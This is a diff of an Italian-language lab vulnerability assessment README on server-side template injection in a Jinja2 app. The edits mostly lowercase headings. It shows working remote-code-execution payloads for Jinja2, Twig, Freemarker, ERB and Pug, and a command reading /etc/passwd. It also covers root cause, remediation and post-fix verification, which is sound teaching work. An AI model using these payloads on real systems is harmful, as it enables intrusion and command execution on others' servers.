@@ -1,6 +1,6 @@
 > [English](README.en.md) | **Italiano**
 
-# Vulnerability Assessment: Server-Side Template Injection (SSTI)
+# Vulnerability assessment: Server-Side template injection (SSTI)
 
 > - **Fase:** Web Attack - Server Side Template Injection
 > - **Visibilita:** Media - richieste HTTP con payload `{{ }}` nel parametro URL, simili a input utente normali
@@ -13,7 +13,7 @@
 
 ---
 
-## 1 Executive Summary
+## 1 Executive summary
 
 Durante l'analisi di sicurezza dell'applicazione web (ambiente di laboratorio), è stata identificata una vulnerabilità critica di tipo Server-Side Template Injection (SSTI).
 
@@ -25,9 +25,9 @@ L'impatto è valutato come CRITICO poiché garantisce all'attaccante il controll
 
 ---
 
-## 2 Technical Analysis
+## 2 Technical analysis
 
-#### Fase 1: Detection & Verification
+#### Fase 1: detection & verification
 
 L'attività di ricognizione ha evidenziato che il parametro `name` viene riflesso nella risposta HTML senza adeguata sanitizzazione.
 Per confermare l'uso di un motore di template lato server, è stato iniettato un payload matematico.
@@ -37,7 +37,7 @@ Per confermare l'uso di un motore di template lato server, è stato iniettato un
 
 ![](./img/Screenshot_2026-02-15_17_52_58.jpg)
 
-#### Fase 2: Exploitation (Remote Code Execution)
+#### Fase 2: exploitation (remote code execution)
 
 Sfruttando la capacità del template engine di accedere agli oggetti interni di Python (tramite Method Resolution Order - MRO), è stato costruito un exploit chain per accedere al modulo `os` ed eseguire comandi di sistema.
 
@@ -57,7 +57,7 @@ Come mostrato nello screenshot sottostante, è stato possibile esfiltrare la lis
 
 ---
 
-## 3 Root Cause Analysis (Code Review)
+## 3 Root cause analysis (code review)
 
 L'analisi del codice sorgente (`ssti_vuln.py`) ha rivelato la causa radice del problema. L'applicazione utilizza la concatenazione di stringhe (f-string) per inserire l'input utente nel template prima che questo venga processato dal motore di rendering.
 
@@ -74,7 +74,7 @@ In questa configurazione, qualsiasi carattere speciale (come `{{` o `}}`) inseri
 
 ---
 
-## 4 Remediation Plan
+## 4 Remediation plan
 
 Per mitigare la vulnerabilità, è necessario separare rigorosamente la logica di presentazione dai dati. Non si deve mai concatenare input utente direttamente in una stringa di template.
 
@@ -92,7 +92,7 @@ return render_template_string("<h1>Ciao, {{ person }}!</h1>", person=person)
 
 ---
 
-## 5 Post-Remediation Verification
+## 5 Post-Remediation verification
 
 Dopo l'implementazione del piano di rientro (Remediation Plan), è stata eseguita una nuova sessione di test per verificare l'efficacia delle contromisure adottate nel codice sorgente.
 
@@ -127,9 +127,9 @@ La vulnerabilità SSTI è stata correttamente mitigata tramite l'adozione di pra
 
 ---
 
-## Analisi a Basso Livello: SSTI Detection Tree e Python MRO
+## Analisi a basso livello: SSTI detection tree e python MRO
 
-### Decision Tree per Identificare il Template Engine
+### Decision tree per identificare il template engine
 
 Non tutti i template engine rispondono allo stesso payload. L'identificazione del motore segue un albero decisionale:
 
@@ -155,7 +155,7 @@ Input: ${7*7}
                       +-- Output: #{7*7} -> ERB, Slim, altro
 ```
 
-### Method Resolution Order (MRO) - La Catena di Escape
+### Method resolution order (MRO) - la catena di escape
 
 L'exploit SSTI in Jinja2 sfrutta l'MRO di Python per risalire dalla sandbox del template all'interprete Python completo:
 
@@ -183,19 +183,19 @@ L'exploit SSTI in Jinja2 sfrutta l'MRO di Python per risalire dalla sandbox del 
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-### SSTI in Altri Template Engine
+### SSTI in altri template engine
 
-| Engine | Linguaggio | Payload Detection | Payload RCE |
+| engine | linguaggio | payload detection | payload rce |
 | :--- | :--- | :--- | :--- |
-| Jinja2 | Python | `{{7*7}}` = 49 | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
-| Twig | PHP | `{{7*7}}` = 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
-| Freemarker | Java | `${7*7}` = 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
-| ERB | Ruby | `<%= 7*7 %>` = 49 | `<%= system("id") %>` |
-| Pug | Node.js | `#{7*7}` = 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |
+| jinja2 | python | `{{7*7}}` = 49 | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
+| twig | php | `{{7*7}}` = 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
+| freemarker | java | `${7*7}` = 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
+| erb | ruby | `<%= 7*7 %>` = 49 | `<%= system("id") %>` |
+| pug | node.js | `#{7*7}` = 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |
 
 ---
 
-## Esperienza di Laboratorio
+## Esperienza di laboratorio
 
 Il test iniziale con `{{ 7*7 }}` ha prodotto `49`, confermando immediatamente la presenza di SSTI. La semplicita del payload di detection contrasta con la complessita dell'exploit RCE: passare da "49" a "esecuzione di comandi" richiede la comprensione dell'MRO di Python e della gerarchia delle classi, concetti non banali per chi non conosce gli internals del linguaggio.
 
@@ -207,11 +207,11 @@ La verifica post-remediation ha dimostrato che il fix (passare la variabile come
 
 ## Mappatura MITRE ATT&CK
 
-| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
+| tattica | tecnica | id mitre | descrizione dell'azione |
 | :--- | :--- | :--- | :--- |
-| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation della SSTI Jinja2 tramite payload `{{ 7*7 }}` per confermare l'esecuzione di codice lato server, seguita da escalation a RCE (WEB-008) |
-| Execution | Command and Scripting Interpreter: Python | `T1059.006` | Accesso al modulo `os` di Python tramite Method Resolution Order (MRO) per eseguire comandi di sistema: `popen('cat /etc/passwd').read()` (WEB-008) |
-| Discovery | File and Directory Discovery | `T1083` | Lettura del file `/etc/passwd` tramite RCE, rivelando la lista degli utenti di sistema incluso `root` (WEB-008) |
+| initial access | exploit public-facing application | `T1190` | exploitation della ssti jinja2 tramite payload `{{ 7*7 }}` per confermare l'esecuzione di codice lato server, seguita da escalation a rce (WEB-008) |
+| execution | command and scripting interpreter: python | `T1059.006` | accesso al modulo `os` di python tramite method resolution order (mro) per eseguire comandi di sistema: `popen('cat /etc/passwd').read()` (WEB-008) |
+| discovery | file and directory discovery | `T1083` | lettura del file `/etc/passwd` tramite rce, rivelando la lista degli utenti di sistema incluso `root` (WEB-008) |
 
 ---
 
